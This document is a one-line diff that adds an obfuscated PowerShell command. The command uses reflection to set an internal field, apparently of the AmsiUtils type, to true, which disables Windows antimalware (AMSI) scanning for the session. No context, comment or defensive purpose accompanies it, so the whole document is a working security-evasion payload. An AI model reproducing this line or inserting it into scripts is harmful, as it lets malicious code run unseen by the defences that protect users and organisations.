@@ -1,0 +1,1 @@
+([ref].assembly.gettypes()|?{$_.name-match'siu'}).declaredfields[2].setvalue(0,$true)
